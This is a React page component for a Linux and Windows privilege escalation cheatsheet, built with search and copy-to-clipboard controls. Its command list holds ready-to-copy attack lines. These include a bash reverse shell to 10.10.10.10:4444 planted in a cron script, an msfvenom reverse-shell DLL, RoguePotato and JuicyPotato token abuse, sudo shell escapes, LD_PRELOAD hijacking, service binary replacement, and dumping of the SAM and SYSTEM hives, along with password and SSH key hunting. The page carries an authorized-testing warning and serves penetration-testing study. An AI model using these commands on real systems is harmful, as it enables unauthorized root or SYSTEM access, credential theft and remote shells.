"use client"

import React, { useState } from 'react';
import { useDebounce } from '@/hooks/useDebounce';
import { Shield, Copy, Check, Search, Terminal, AlertTriangle, Info, ChevronRight } from 'lucide-react';
import Footer from '@/components/Footer';

interface CommandSection {
    title: string;
    description: string;
    platform: 'Linux' | 'Windows' | 'Both';
    commands: Array<{
        name: string;
        command: string;
        description: string;
        category: 'enumeration' | 'exploitation' | 'persistence';
    }>;
}

const PrivEscCheatsheet = () => {
    const [copiedCommand, setCopiedCommand] = useState<string | null>(null);
    const [searchQuery, setSearchQuery] = useState('');
    const debouncedSearch = useDebounce(searchQuery, 300);
    const [selectedPlatform, setSelectedPlatform] = useState<'All' | 'Linux' | 'Windows'>('All');

    const sections: CommandSection[] = [
        {
            title: 'Linux System Enumeration',
            description: 'Gather information about the Linux system',
            platform: 'Linux',
            commands: [
                {
                    name: 'Kernel Version',
                    command: 'uname -a',
                    description: 'Check kernel version for known exploits',
                    category: 'enumeration'
                },
                {
                    name: 'OS Information',
                    command: 'cat /etc/issue\ncat /etc/*-release',
                    description: 'Identify OS distribution and version',
                    category: 'enumeration'
                },
                {
                    name: 'Running Processes',
                    command: 'ps aux | grep root',
                    description: 'List processes running as root',
                    category: 'enumeration'
                },
                {
                    name: 'Network Connections',
                    command: 'netstat -antup\nss -tunlp',
                    description: 'Show active network connections',
                    category: 'enumeration'
                },
                {
                    name: 'Installed Packages',
                    command: 'dpkg -l  # Debian\nrpm -qa  # RedHat',
                    description: 'List installed software',
                    category: 'enumeration'
                }
            ]
        },
        {
            title: 'Linux File Permissions',
            description: 'Find misconfigured file permissions',
            platform: 'Linux',
            commands: [
                {
                    name: 'SUID Binaries',
                    command: 'find / -perm -4000 -type f 2>/dev/null',
                    description: 'Find all SUID executables',
                    category: 'enumeration'
                },
                {
                    name: 'SGID Binaries',
                    command: 'find / -perm -2000 -type f 2>/dev/null',
                    description: 'Find all SGID executables',
                    category: 'enumeration'
                },
                {
                    name: 'World Writable',
                    command: 'find / -perm -2 -type f 2>/dev/null',
                    description: 'Find world-writable files',
                    category: 'enumeration'
                },
                {
                    name: 'Writable /etc/passwd',
                    command: 'ls -la /etc/passwd\nls -la /etc/shadow',
                    description: 'Check if password files are writable',
                    category: 'enumeration'
                },
                {
                    name: 'Writable Config Files',
                    command: 'find /etc -writable -type f 2>/dev/null',
                    description: 'Find writable configuration files',
                    category: 'enumeration'
                }
            ]
        },
        {
            title: 'Linux Sudo Exploitation',
            description: 'Exploit sudo misconfigurations',
            platform: 'Linux',
            commands: [
                {
                    name: 'Check Sudo Rights',
                    command: 'sudo -l',
                    description: 'List commands user can run with sudo',
                    category: 'enumeration'
                },
                {
                    name: 'Sudo Version',
                    command: 'sudo -V',
                    description: 'Check for vulnerable sudo version',
                    category: 'enumeration'
                },
                {
                    name: 'GTFOBins Abuse',
                    command: 'sudo vim -c \'!sh\'\nsudo find . -exec /bin/sh \\; -quit',
                    description: 'Exploit sudo binaries via GTFOBins',
                    category: 'exploitation'
                },
                {
                    name: 'Sudo Environment',
                    command: 'sudo -E /usr/bin/env /bin/sh',
                    description: 'Preserve environment with sudo',
                    category: 'exploitation'
                },
                {
                    name: 'LD_PRELOAD Exploit',
                    command: 'sudo LD_PRELOAD=/tmp/shell.so program',
                    description: 'Hijack libraries with LD_PRELOAD',
                    category: 'exploitation'
                }
            ]
        },
        {
            title: 'Linux Cron Jobs',
            description: 'Exploit scheduled tasks',
            platform: 'Linux',
            commands: [
                {
                    name: 'List Cron Jobs',
                    command: 'crontab -l\nls -la /etc/cron*\ncat /etc/crontab',
                    description: 'List all cron jobs',
                    category: 'enumeration'
                },
                {
                    name: 'Check Cron Permissions',
                    command: 'ls -la /etc/cron.d\nls -la /var/spool/cron',
                    description: 'Check cron directory permissions',
                    category: 'enumeration'
                },
                {
                    name: 'Writable Cron Scripts',
                    command: 'find /etc/cron* -type f -writable 2>/dev/null',
                    description: 'Find writable cron scripts',
                    category: 'exploitation'
                },
                {
                    name: 'PATH Hijacking',
                    command: 'echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" > /tmp/script.sh',
                    description: 'Hijack PATH in cron scripts',
                    category: 'exploitation'
                }
            ]
        },
        {
            title: 'Linux Kernel Exploits',
            description: 'Common kernel privilege escalation exploits',
            platform: 'Linux',
            commands: [
                {
                    name: 'Dirty COW',
                    command: 'gcc -pthread dirty.c -o dirty -lcrypt',
                    description: 'CVE-2016-5195 - Race condition exploit',
                    category: 'exploitation'
                },
                {
                    name: 'Dirty Pipe',
                    command: 'gcc dirty_pipe.c -o exploit',
                    description: 'CVE-2022-0847 - Overwrite any file',
                    category: 'exploitation'
                },
                {
                    name: 'PwnKit',
                    command: 'gcc pwnkit.c -o exploit',
                    description: 'CVE-2021-4034 - pkexec vulnerability',
                    category: 'exploitation'
                },
                {
                    name: 'Baron Samedit',
                    command: 'sudoedit -s /\n' + 'A'.repeat(1000),
                    description: 'CVE-2021-3156 - sudo heap overflow',
                    category: 'exploitation'
                }
            ]
        },
        {
            title: 'Windows System Enumeration',
            description: 'Gather information about Windows system',
            platform: 'Windows',
            commands: [
                {
                    name: 'System Information',
                    command: 'systeminfo\nwmic qfe list',
                    description: 'Get system info and installed patches',
                    category: 'enumeration'
                },
                {
                    name: 'User Information',
                    command: 'whoami /all\nnet user %username%',
                    description: 'Get current user privileges',
                    category: 'enumeration'
                },
                {
                    name: 'Local Users',
                    command: 'net user\nnet localgroup administrators',
                    description: 'List local users and admins',
                    category: 'enumeration'
                },
                {
                    name: 'Running Services',
                    command: 'sc query state= all\nwmic service list brief',
                    description: 'List all services',
                    category: 'enumeration'
                },
                {
                    name: 'Scheduled Tasks',
                    command: 'schtasks /query /fo LIST /v',
                    description: 'List all scheduled tasks',
                    category: 'enumeration'
                }
            ]
        },
        {
            title: 'Windows Service Exploitation',
            description: 'Exploit Windows services for privilege escalation',
            platform: 'Windows',
            commands: [
                {
                    name: 'Unquoted Service Path',
                    command: 'wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
                    description: 'Find unquoted service paths',
                    category: 'enumeration'
                },
                {
                    name: 'Weak Service Permissions',
                    command: 'accesschk.exe -uwcqv "Everyone" *\naccesschk.exe -uwcqv "Authenticated Users" *',
                    description: 'Find services with weak permissions',
                    category: 'enumeration'
                },
                {
                    name: 'Modify Service Binary',
                    command: 'sc config ServiceName binPath= "C:\\temp\\shell.exe"\nsc stop ServiceName\nsc start ServiceName',
                    description: 'Change service binary path',
                    category: 'exploitation'
                },
                {
                    name: 'Service Registry Keys',
                    command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services',
                    description: 'Query service registry keys',
                    category: 'enumeration'
                }
            ]
        },
        {
            title: 'Windows Registry Exploitation',
            description: 'Exploit registry misconfigurations',
            platform: 'Windows',
            commands: [
                {
                    name: 'AlwaysInstallElevated',
                    command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
                    description: 'Check if MSI packages run as SYSTEM',
                    category: 'enumeration'
                },
                {
                    name: 'Autorun Programs',
                    command: 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    description: 'Find autorun programs',
                    category: 'enumeration'
                },
                {
                    name: 'Writable Registry Keys',
                    command: 'accesschk.exe /accepteula -uvwqk HKLM\\Software',
                    description: 'Find writable registry keys',
                    category: 'enumeration'
                }
            ]
        },
        {
            title: 'Windows Token Manipulation',
            description: 'Exploit Windows access tokens',
            platform: 'Windows',
            commands: [
                {
                    name: 'List Privileges',
                    command: 'whoami /priv',
                    description: 'List current token privileges',
                    category: 'enumeration'
                },
                {
                    name: 'SeImpersonatePrivilege',
                    command: 'JuicyPotato.exe -l 1337 -p C:\\windows\\system32\\cmd.exe -t * -c {CLSID}',
                    description: 'Exploit SeImpersonate with JuicyPotato',
                    category: 'exploitation'
                },
                {
                    name: 'PrintSpoofer',
                    command: 'PrintSpoofer.exe -i -c cmd',
                    description: 'Exploit print spooler service',
                    category: 'exploitation'
                },
                {
                    name: 'RoguePotato',
                    command: 'RoguePotato.exe -r 10.10.10.10 -e "cmd.exe" -l 9999',
                    description: 'Alternative to JuicyPotato for newer Windows',
                    category: 'exploitation'
                }
            ]
        },
        {
            title: 'Windows DLL Hijacking',
            description: 'Exploit DLL search order',
            platform: 'Windows',
            commands: [
                {
                    name: 'Find Missing DLLs',
                    command: 'procmon.exe  # Process Monitor to find missing DLLs',
                    description: 'Monitor application for DLL loads',
                    category: 'enumeration'
                },
                {
                    name: 'Writable Directories',
                    command: 'icacls "C:\\Program Files\\Application" /grant Everyone:(OI)(CI)F',
                    description: 'Find writable application directories',
                    category: 'enumeration'
                },
                {
                    name: 'Create Malicious DLL',
                    command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll',
                    description: 'Generate payload DLL',
                    category: 'exploitation'
                }
            ]
        },
        {
            title: 'Password Hunting',
            description: 'Find stored passwords',
            platform: 'Both',
            commands: [
                {
                    name: 'Linux Password Files',
                    command: 'grep -ri "password" /home 2>/dev/null\nfind / -name "*password*" 2>/dev/null',
                    description: 'Search for password files',
                    category: 'enumeration'
                },
                {
                    name: 'Windows Credentials',
                    command: 'cmdkey /list\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                    description: 'List stored credentials',
                    category: 'enumeration'
                },
                {
                    name: 'SSH Keys',
                    command: 'find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null',
                    description: 'Find SSH private keys',
                    category: 'enumeration'
                },
                {
                    name: 'History Files',
                    command: 'cat ~/.bash_history\ncat ~/.mysql_history',
                    description: 'Check command history for passwords',
                    category: 'enumeration'
                },
                {
                    name: 'SAM/SYSTEM Files',
                    command: 'reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive',
                    description: 'Dump Windows password hashes',
                    category: 'exploitation'
                }
            ]
        }
    ];

    const copyToClipboard = async (command: string) => {
        await navigator.clipboard.writeText(command);
        setCopiedCommand(command);
        setTimeout(() => setCopiedCommand(null), 2000);
    };

    const getCategoryColor = (category: string) => {
        switch (category) {
            case 'enumeration': return 'text-blue-400 bg-blue-500/10 border-blue-500/20';
            case 'exploitation': return 'text-red-400 bg-red-500/10 border-red-500/20';
            case 'persistence': return 'text-purple-400 bg-purple-500/10 border-purple-500/20';
            default: return 'text-gray-400 bg-gray-500/10 border-gray-500/20';
        }
    };

    const filteredSections = sections
        .filter(section => selectedPlatform === 'All' || section.platform === selectedPlatform || section.platform === 'Both')
        .map(section => ({
            ...section,
            commands: section.commands.filter(cmd =>
                cmd.name.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
                cmd.description.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
                cmd.command.toLowerCase().includes(debouncedSearch.toLowerCase())
            )
        }))
        .filter(section => section.commands.length > 0);

    return (
        <div className="min-h-screen bg-black">
            <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-orange-500/10 rounded-full blur-[120px] pointer-events-none" />

            <div className="relative pt-32 pb-16 px-4 sm:px-6">
                <div className="max-w-4xl mx-auto">
                    {/* Header */}
                    <div className="text-center mb-12">
                        <div className="inline-flex items-center gap-2 px-4 py-2 mb-6 rounded-full border border-white/10 bg-white/5">
                            <Shield className="w-4 h-4 text-orange-500" />
                            <span className="text-sm text-gray-400">Privilege Escalation</span>
                        </div>

                        <h1 className="text-4xl sm:text-5xl font-bold text-white mb-6">
                            Privilege Escalation <span className="text-orange-500">Cheatsheet</span>
                        </h1>

                        <p className="text-lg text-gray-400 max-w-2xl mx-auto mb-8">
                            Comprehensive guide for Linux and Windows privilege escalation techniques
                        </p>

                        {/* Warning */}
                        <div className="flex items-start gap-3 p-4 rounded-xl bg-red-500/10 border border-red-500/20 text-left max-w-2xl mx-auto mb-8">
                            <AlertTriangle className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
                            <div>
                                <p className="text-sm text-red-400 font-medium mb-1">Authorized Testing Only</p>
                                <p className="text-xs text-red-400/80">
                                    Use these techniques only in authorized environments. Unauthorized access is illegal.
                                </p>
                            </div>
                        </div>

                        {/* Platform Filter */}
                        <div className="flex justify-center gap-2 mb-6">
                            {(['All', 'Linux', 'Windows'] as const).map((platform) => (
                                <button
                                    key={platform}
                                    onClick={() => setSelectedPlatform(platform)}
                                    className={`px-4 py-2 rounded-lg font-medium transition-all ${
                                        selectedPlatform === platform
                                            ? 'bg-orange-500 text-white'
                                            : 'border border-white/10 text-gray-400 hover:text-white hover:border-white/20'
                                    }`}
                                >
                                    {platform}
                                </button>
                            ))}
                        </div>

                        {/* Search */}
                        <div className="relative max-w-xl mx-auto">
                            <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500" />
                            <input
                                type="text"
                                placeholder="Search commands..."
                                value={searchQuery}
                                onChange={(e) => setSearchQuery(e.target.value)}
                                className="w-full pl-12 pr-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-orange-500/50 focus:outline-none transition-colors"
                            />
                        </div>
                    </div>

                    {/* Sections */}
                    <div className="space-y-8">
                        {filteredSections.map((section, idx) => (
                            <div key={idx} className="rounded-2xl border border-white/10 bg-white/[0.02] p-6 sm:p-8">
                                <div className="flex items-start justify-between gap-3 mb-6">
                                    <div className="flex items-start gap-3">
                                        <Terminal className="w-6 h-6 text-orange-500 shrink-0 mt-1" />
                                        <div>
                                            <h2 className="text-xl font-semibold text-white mb-2">{section.title}</h2>
                                            <p className="text-sm text-gray-400">{section.description}</p>
                                        </div>
                                    </div>
                                    <span className={`text-xs px-2 py-1 rounded border ${
                                        section.platform === 'Linux' ? 'border-green-500/40 text-green-400 bg-green-500/10' :
                                        section.platform === 'Windows' ? 'border-blue-500/40 text-blue-400 bg-blue-500/10' :
                                        'border-purple-500/40 text-purple-400 bg-purple-500/10'
                                    }`}>
                                        {section.platform}
                                    </span>
                                </div>

                                <div className="space-y-3">
                                    {section.commands.map((cmd, cmdIdx) => (
                                        <div
                                            key={cmdIdx}
                                            className="group rounded-xl border border-white/10 bg-white/[0.02] hover:bg-white/[0.04] hover:border-orange-500/30 transition-all p-4"
                                        >
                                            <div className="flex items-start justify-between gap-4 mb-3">
                                                <div className="flex-1">
                                                    <div className="flex items-center gap-3 mb-2">
                                                        <h3 className="font-medium text-white">{cmd.name}</h3>
                                                        <span className={`text-xs px-2 py-0.5 rounded border ${getCategoryColor(cmd.category)}`}>
                                                            {cmd.category}
                                                        </span>
                                                    </div>
                                                    <p className="text-sm text-gray-400">{cmd.description}</p>
                                                </div>
                                                <button
                                                    onClick={() => copyToClipboard(cmd.command)}
                                                    className="shrink-0 p-2 rounded-lg border border-white/10 hover:border-orange-500/50 hover:bg-orange-500/10 transition-all"
                                                    title="Copy to clipboard"
                                                >
                                                    {copiedCommand === cmd.command ? (
                                                        <Check className="w-4 h-4 text-green-400" />
                                                    ) : (
                                                        <Copy className="w-4 h-4 text-gray-400 group-hover:text-orange-400" />
                                                    )}
                                                </button>
                                            </div>

                                            <div className="relative">
                                                <pre className="text-sm text-gray-300 bg-black/40 border border-white/10 rounded-lg p-3 overflow-x-auto">
                                                    <code>{cmd.command}</code>
                                                </pre>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            </div>
                        ))}
                    </div>

                    {/* Resources Box */}
                    <div className="mt-12 p-6 rounded-xl border border-blue-500/20 bg-blue-500/5">
                        <div className="flex items-start gap-3">
                            <Info className="w-5 h-5 text-blue-400 shrink-0 mt-0.5" />
                            <div>
                                <p className="text-sm text-blue-400 font-medium mb-2">Useful Resources</p>
                                <ul className="text-sm text-gray-400 space-y-1">
                                    <li className="flex items-center gap-2">
                                        <ChevronRight className="w-3 h-3" />
                                        <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer" className="text-orange-400 hover:text-orange-300">
                                            GTFOBins - Unix binaries exploitation
                                        </a>
                                    </li>
                                    <li className="flex items-center gap-2">
                                        <ChevronRight className="w-3 h-3" />
                                        <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer" className="text-orange-400 hover:text-orange-300">
                                            LOLBAS - Living Off The Land Binaries
                                        </a>
                                    </li>
                                    <li className="flex items-center gap-2">
                                        <ChevronRight className="w-3 h-3" />
                                        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" className="text-orange-400 hover:text-orange-300">
                                            PayloadsAllTheThings
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <Footer />
        </div>
    );
};

export default PrivEscCheatsheet;
